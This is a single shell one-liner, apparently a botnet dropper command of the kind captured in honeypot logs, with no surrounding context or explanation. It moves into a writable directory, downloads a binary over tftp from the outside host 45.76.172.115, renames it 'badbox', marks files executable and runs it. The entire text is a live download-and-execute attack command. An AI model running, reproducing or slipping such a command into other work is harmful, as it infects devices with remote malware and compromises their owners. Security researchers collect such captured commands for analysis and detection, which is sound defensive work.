cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.76.172.115 -c get wget;cat wget >badbox;chmod +x *;./badbox
